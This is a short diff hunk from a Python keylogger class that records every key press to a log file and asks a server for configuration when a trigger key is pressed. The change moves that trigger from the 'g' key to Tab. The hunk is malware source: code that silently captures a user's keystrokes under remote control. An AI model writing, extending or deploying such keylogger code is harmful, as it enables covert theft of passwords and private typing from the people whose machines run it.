@@ -17,12 +17,11 @@ class Keylogger(Thread):
         if self.__config.debug:
             print(key, end='')
         try:
-            if key.__str__() == 'g':
+            if key == Key.tab:
                 self.__communication.getConfigFromServer()
         except Exception:
             pass
         Util.fileOut(self.__config.logPath + self.__config.logFileName, key)
-            
 
 
     def run(self):
